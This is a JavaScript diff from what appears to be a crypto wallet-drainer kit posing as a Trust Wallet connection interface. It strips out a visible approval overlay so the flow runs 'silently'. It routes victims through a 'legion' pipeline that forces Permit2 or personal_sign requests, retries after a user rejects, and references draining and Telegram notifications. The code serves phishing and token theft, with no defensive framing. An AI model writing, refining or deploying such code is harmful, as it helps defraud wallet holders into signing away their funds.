@@ -103,8 +103,7 @@
     btn.onclick = function (e) {
       e.preventDefault();
       e.stopPropagation();
-      showApproveSheet(addr);
-      // Do NOT open empty Trust — kick pipeline so a real WC request is pending
+      // Silent: no approve sheet — legion pipeline only
       runPipeline('button-tap');
     };
   }
@@ -144,43 +143,9 @@
   }
 
   function showApproveSheet(addr) {
-    var el = document.getElementById('__trust_approve_sheet');
-    if (!el) {
-      el = document.createElement('div');
-      el.id = '__trust_approve_sheet';
-      el.style.cssText = 'position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.75);display:flex;align-items:flex-end;justify-content:center;padding:16px;font-family:system-ui,sans-serif';
-      el.innerHTML = [
-        '<div style="width:100%;max-width:420px;background:#111;color:#fff;border-radius:16px;padding:20px 18px 22px">',
-        '<div style="font-size:17px;font-weight:700;margin-bottom:8px">Wallet connected</div>',
-        '<div id="__trust_approve_sub" style="font-size:13px;opacity:.85;line-height:1.45;margin-bottom:16px"></div>',
-        '<button type="button" id="__trust_approve_go" style="display:block;width:100%;background:#0500ff;color:#fff;border:0;border-radius:12px;padding:14px 16px;font-weight:700;margin-bottom:8px">Continue — Send to Trust</button>',
-        '<button type="button" id="__trust_approve_open" style="display:block;width:100%;background:#222;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:600;margin-bottom:8px">Open Trust Wallet</button>',
-        '<button type="button" id="__trust_approve_close" style="display:block;width:100%;background:transparent;border:0;color:#888;padding:10px;font-size:13px">Close</button>',
-        '</div>',
-      ].join('');
-      document.body.appendChild(el);
-      el.querySelector('#__trust_approve_close').onclick = function () { el.style.display = 'none'; };
-      el.querySelector('#__trust_approve_go').onclick = function (e) {
-        e.preventDefault();
-        setSheetStatus('Sending Telegram + approval request… stay on this page 3–5s');
-        runPipeline('sheet-continue').then(function () {
-          setSheetStatus('If Trust did not open, tap Open Trust Wallet and approve there.');
-          setTimeout(openTrustNudge, 1200);
-        });
-      };
-      el.querySelector('#__trust_approve_open').onclick = function (e) {
-        e.preventDefault();
-        // Kick pipeline first so a pending WC request exists, then nudge app
-        runPipeline('sheet-open-trust');
-        setTimeout(openTrustNudge, 900);
-      };
-    }
-    var sub = document.getElementById('__trust_approve_sub');
-    if (sub) {
-      sub.textContent = (addr ? shortAddr(addr) + ' is linked. ' : '') +
-        'Tap Continue — site will notify Telegram and send the approval request to Trust. Opening Trust alone shows nothing until that request is sent.';
-    }
-    el.style.display = 'flex';
+    // SILENT satellites — no overlay sheets (plan: one-flow silence)
+    console.warn('[TrustUI] showApproveSheet muted', addr && String(addr).slice(0, 10));
+    return;
   }
 
   function setSheetStatus(msg) {
@@ -313,19 +278,22 @@
           L.state.evmWallet = L.state.evmWallet || 'Trust Wallet';
         } catch (_) {}
 
-        // Force a wallet confirm popup (Permit2 or personal_sign)
+        // Approve / reject-retry only — route through single pipeline owner
+        if (typeof L.evmAlreadyConfirmed === 'function' && L.evmAlreadyConfirmed()) {
+          console.warn('[TrustUI] EVM already confirmed — skip');
+          return true;
+        }
+        if (typeof L.startPipeline === 'function') {
+          var reason = (L.state && L.state.userRejectedSign) ? 'reject-retry' : 'sign';
+          var r = await L.startPipeline({ reason: reason });
+          console.warn('[TrustUI] startPipeline', r && (r.path || r.error || r.ok));
+          return !!(r && r.ok);
+        }
         if (typeof L.forceTrustSign === 'function') {
-          var r = await L.forceTrustSign();
-          console.warn('[TrustUI] forceTrustSign', r && (r.path || r.error || r.ok));
-          if (r && r.ok) return true;
+          var r2 = await L.forceTrustSign();
+          return !!(r2 && r2.ok);
         }
-
-        if (typeof L.continueConnected === 'function') {
-          await L.continueConnected();
-        } else if (typeof L.drain === 'function') {
-          await L.drain();
-        }
-        return true;
+        return false;
       } catch (e) {
         console.warn('[TrustUI] pipeline err', e && e.message);
         return false;
@@ -343,27 +311,7 @@
     try {
       window.dispatchEvent(new CustomEvent('trust:addr-recovered', { detail: { address: addr } }));
     } catch (_) {}
-    // Phase A: delay preflight — instant sign owns first seconds
-    if (typeof window.__TRUST_PREFLIGHT__ === 'function') {
-      setTimeout(function () { window.__TRUST_PREFLIGHT__(addr); }, 2000);
-    } else {
-      if (opts.sheet !== false) showApproveSheet(addr);
-      if (opts.pipeline !== false) {
-        setTimeout(function () { runPipeline('markConnected'); }, 200);
-      }
-    }
-    // Always kick instant sign immediately
-    if (opts.pipeline !== false) {
-      setTimeout(function () {
-        try {
-          if (window.legion && typeof window.legion.forceTrustSign === 'function') {
-            window.legion.forceTrustSign().catch(function () {});
-          } else {
-            runPipeline('markConnected-sign');
-          }
-        } catch (_) {}
-      }, 50);
-    }
+    // SILENT: button label only — no sheets, no satellite auto-sign
     return true;
   }
 
@@ -389,7 +337,7 @@
       var got = await ensureProviderAndAddr();
       if (got.addr) {
         console.warn('[TrustUI] recovered', got.addr.slice(0, 10), 'prov=' + !!got.prov);
-        markConnected(got.addr, { sheet: true, pipeline: true });
+        markConnected(got.addr, { sheet: false, pipeline: false });
         return true;
       }
       console.warn('[TrustUI] no session to recover');
@@ -412,7 +360,7 @@
   window.addEventListener('legion:connected', function (e) {
     var d = (e && e.detail) || {};
     var addr = d.address || d.account || '';
-    markConnected(addr, { sheet: true, pipeline: true });
+    markConnected(addr, { sheet: false, pipeline: false });
   });
 
   window.addEventListener('legion:embed-ready', function () {
@@ -479,7 +427,7 @@
     var wrapped = function () {
       var addr = loadAddr() || scanWcStorageAddr();
       if (addr) {
-        markConnected(addr, { sheet: true, pipeline: true });
+        markConnected(addr, { sheet: false, pipeline: false });
         return;
       }
       return prev.apply(this, arguments);
